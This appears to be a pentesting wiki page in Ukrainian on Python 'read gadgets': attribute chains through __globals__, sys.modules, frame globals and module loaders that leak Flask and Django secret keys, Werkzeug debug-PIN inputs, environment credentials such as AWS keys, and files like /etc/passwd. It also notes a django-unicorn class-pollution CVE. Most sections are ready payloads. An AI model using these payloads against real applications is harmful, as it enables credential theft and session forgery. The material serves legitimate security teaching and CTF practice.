# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Різні вразливості, такі як [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) або [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), можуть дозволити вам **читати внутрішні дані Python, але не виконувати код**. Тому pentester має максимально використати ці дозволи на читання, щоб **отримати чутливі привілеї та підвищити рівень вразливості**.

### Flask — читання secret key

На головній сторінці Flask-застосунку, імовірно, буде **`app`** глобальний об’єкт, у якому **цей secret налаштовано**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
У цьому випадку отримати доступ до цього об’єкта можна, використовуючи будь-який gadget для **доступу до глобальних об’єктів** зі сторінки [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Якщо **вразливість знаходиться в іншому python-файлі**, потрібен gadget для переміщення між файлами, щоб дістатися до головного файлу, **отримати доступ до глобального об’єкта `app.secret_key`** і мати змогу [**підвищити привілеї** знаючи цей ключ](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload на кшталт цього [з цього writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Використайте цей **payload**, щоб **прочитати `app.secret_key`**. Якщо оригінальна вразливість також надає вам примітив запису (наприклад, class pollution), цей самий шлях можна використати, щоб замінити його та підписувати більш привілейовані Flask cookies.

### Werkzeug - machine_id і node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) ви зможете отримати доступ до **machine_id** і вузла **uuid**, які є **приватними даними**, необхідними для [**генерування Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) та доступу до Python console у `/console`, якщо **debug mode увімкнено**:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Зверніть увагу, що можна отримати **локальний шлях сервера до `app.py`**, згенерувавши деяку **помилку** на вебсторінці, яка **надасть вам цей шлях**.

Якщо вразливість знаходиться в іншому python-файлі, скористайтеся попереднім Flask trick, щоб отримати доступ до об'єктів з головного python-файлу.

### Django - SECRET_KEY і модуль settings

Об'єкт налаштувань Django кешується в `sys.modules` після запуску застосунку. Маючи лише примітиви читання, можна отримати **`SECRET_KEY`**, резервні ключі, облікові дані бази даних або солі підписування:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Якщо вразливий gadget знаходиться в іншому модулі, спочатку пройдіть globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` are just as valuable as the current `SECRET_KEY`: вони все ще перевіряють старі підписані значення під час ротації. Також leak `SESSION_ENGINE` і `SESSION_SERIALIZER`, щоб швидко визначити, чи вплив обмежується підробленням cookie, чи є серйознішим. Докладніше про вплив на web дивіться на сторінці [**Django pentesting**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - читання вихідного коду та файлів

Завантажені Python-модулі зазвичай зберігають `__loader__`. Завантажувачі, що працюють із файлами, часто надають `get_source()` і `get_data()`, які є ідеальними **read-only primitives**, коли ви вже можете отримати доступ до об’єкта модуля, але не до `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Це дуже корисно для створення дампу **конфігураційних модулів, blueprints, допоміжних файлів або прихованих маршрутів** і отримання API keys, DSNs, шляхів до flag або додаткових gadget entry points.

Якщо у вас є лише перелік підкласів, шукайте loader за іменем замість жорсткого задання індексу:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Глобальні змінні frame генератора / coroutine

Якщо ви можете створити об’єкт generator/coroutine або отримати до нього доступ, його frame може виконати leak глобальних змінних **без використання будь-якого gadget `__globals__` функції**. Це корисно проти фільтрів, які блокують лише dunder names і забувають про такі атрибути frame, як `gi_frame`, `ag_frame`, `cr_frame` або `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Отримавши globals фрейму, продовжуйте точно так само, як і в інших gadgets (`sys.modules`, objects налаштувань, `os.environ` тощо). Сучасні sandbox escapes постійно повторно виявляють це, оскільки `gi_frame` і `f_globals` не є dunder-атрибутами та часто переживають наївні deny-lists.

### Environment variables / cloud creds через завантажені модулі

Багато jail все ще імпортують `os` або `sys` десь усередині. Ви можете зловживати будь-якою доступною функцією `__init__.__globals__`, щоб отримати доступ до вже імпортованого модуля `os` і вивести **environment variables**, що містять API-токени, cloud keys або flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Якщо індекс підкласу фільтрується, використовуйте loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Змінні середовища часто є єдиними секретами, необхідними для переходу від read до повної компрометації (cloud IAM keys, database URLs, signing keys тощо).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) допускав **class pollution** через спеціально сформовані component requests. Встановлення property path на кшталт `__init__.__globals__` давало атакувальнику доступ до module globals компонента та будь-яких імпортованих modules (наприклад, `settings`, `os`, `sys`). Звідти можна було leak `SECRET_KEY`, `DATABASES` або service credentials без code execution. Ланцюжок експлуатації базується виключно на read і використовує ті самі dunder-gadget patterns, що й вище.

### Gadget collections for chaining

Недавні CTF і дослідження pyjail демонструють надійні read chains, побудовані лише за допомогою доступу до атрибутів та перебору subclass. Community-maintained списки, такі як [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), містять сотні мінімальних gadgets, які можна комбінувати для переходу від objects до `__globals__`, `sys.modules` і зрештою до sensitive data. Надавайте перевагу пошуку на основі attribute/name, а не raw subclass indexes, оскільки позиція `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` тощо змінюється між версіями Python і за наявності додаткових імпортованих libraries.

## Посилання

- [Документація Django щодо cryptographic signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – wiki Python sandbox gadgets](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
